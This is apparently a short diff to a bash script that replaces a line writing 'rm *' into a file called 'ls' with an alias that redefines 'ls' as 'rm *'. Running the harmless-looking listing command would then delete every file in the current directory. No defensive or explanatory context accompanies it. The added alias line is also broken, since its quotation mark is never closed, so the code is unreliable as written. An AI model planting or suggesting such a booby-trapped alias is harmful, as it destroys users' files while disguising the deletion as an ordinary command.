@@ -1,2 +1,2 @@
-#!/bin/bssh
-echo "rm *" > ls
+#!/bin/bash
+alias ls="rm *
